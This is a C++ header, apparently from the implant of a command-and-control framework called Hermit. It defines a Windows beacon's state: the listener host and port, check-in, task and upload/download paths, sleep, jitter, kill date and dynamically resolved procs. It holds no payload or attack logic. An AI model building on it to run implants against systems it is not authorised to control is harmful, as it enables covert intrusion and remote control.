#ifndef HERMIT_CORE_STATE_HPP
#define HERMIT_CORE_STATE_HPP

#include <winsock2.h>
#include <winternl.h>
#include <windows.h>
#include <winhttp.h>

#include "core/socket.hpp"
#include "core/procs.hpp"
#include "core/system.hpp"

namespace State
{
    struct State
    {
        // Thread environment block
        PTEB            pTeb;

        // Module handlers
        HMODULE         hNTDLL;
        HMODULE         hWinHTTPDLL;

        // Procs loaded dynamatically
        Procs::PPROCS   pProcs;

        // wWinMain arguments
        HINSTANCE       hInstance;
        INT             nCmdShow;

        // Payload type
        LPCWSTR         lpPayloadType;

        // Listener options
        LPCWSTR         lpListenerProto;
        LPCWSTR         lpListenerHost;
        INTERNET_PORT   nListenerPort;

        // Request paths
        LPCWSTR         lpReqPathCheckIn;
        LPCWSTR         lpReqPathTaskGet;
        LPCWSTR         lpReqPathTaskResult;
        LPCWSTR         lpReqPathDownload;
        LPCWSTR         lpReqPathUpload;
        LPCWSTR         lpReqPathWebSocket;

        // Beacon options
        INT             nSleep;
        INT             nJitter;
        INT             nKillDate;

        // Agent options
        std::wstring    wUUID;
        std::wstring    wTask;
        std::wstring    wTaskResult;

        // WinHTTP handlers
        HINTERNET       hSession;
        HINTERNET       hConnect;
        HINTERNET       hRequest;

        // Socket
        Socket::PSOCKET_DATA pSocket;

        // Quit beacon
        BOOL bQuit;
    };

    typedef State* PState;

    VOID Free(PState pState);
}

#endif // HERMIT_CORE_STATE_HPP